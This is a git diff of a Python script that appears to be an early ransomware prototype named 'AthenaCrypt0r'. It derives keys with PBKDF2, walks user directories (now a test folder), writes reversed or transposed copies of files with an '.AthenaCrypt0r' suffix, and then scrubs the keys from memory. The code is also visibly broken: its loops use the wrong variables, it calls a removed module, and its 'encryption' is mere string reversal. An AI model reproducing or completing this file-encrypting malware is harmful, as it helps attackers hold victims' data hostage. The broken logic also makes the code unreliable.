@@ -4,11 +4,10 @@ import hashlib as h
 import random as r
 import time as t
 #import urllib.request
-import transpositionEncrypt as te 
-import transpositionDecrypt as td
+import reverseCryptor as rc
 
 def generateKey():
-    keyName = "\x43\x72\x79\x70\x74\x30\x72" #Cypt0r in hexString
+    keyName = "\x43\x72\x79\x70\x74\x30\x72" #Secret for keygen
     salt = map(ord, keyName) # run KeyName through the ord function, set the value to salt
     r.seed(int(t.time()+r.randint(1,1337))) # generate a peusdo random seed for random
     key = h.pbkdf2_hmac('sha512', bytes(r.randint(1, 65500)), bytes(salt), r.randint(30000,60000)) # generate the encryption key - SHA512 salted, ran over a random amount of times
@@ -16,11 +15,13 @@ def generateKey():
 
     return encryptionKey #return it to the main function
 
-def main(encryptionKey):
+def main(Pubkey, Privkey):
     
-    key = encryptionKey
+    print("Public Key: "+Pubkey + "\n" + "Private Key: " + Privkey)
+    Pubkey = Pubkey
+    Privkey = Privkey
     if os.name == "nt":
-        path = "C:/Users/"
+        path = "C:/TestFolder/"
     else:
         path = "/home/"
 
@@ -28,21 +29,37 @@ def main(encryptionKey):
 
     files = getdirs.getdirs(path)
 
-        # TODO: encryption
-    for files in file:
-        f = open(files, "w+")
-        encrypted = te.encryptMessage(key,f)
-        f.write(encrypted)
+    # TODO: encryption
+    reverseCryptor(files)
 
 
 
     # clear the key out of memory 
     for k in range(1000):
-        key = r.randint(1,86400)
+        Pubkey = r.randint(1,86400)
+        Privkey = r.randint(1,86400)
         pass
 
+    print("Nuked keys - new values are: \n"+ "Public Key: "+ str(Pubkey) + "\n" + "Private key: "+str(Privkey))
 
 
+def transpositionCryptor(key, files):
+        for file in files:
+            f = open(files, "w+")
+            encrypted = te.encryptMessage(key,f)
+            f.write(encrypted)
+
+
+def reverseCryptor(files):
+    outputfile = ".AthenaCrypt0r"
+    for file in files:
+        f = open(files)
+        contents = f.read()
+        f.close()
+        encrypted = rc.reverse(contents)
+        f1 = open(files+outputfile, "w")
+        f1.write(encrypted)
+        f1.close()
 
 if __name__=="__main__":
-    main(generateKey())
+    main(generateKey(), generateKey())
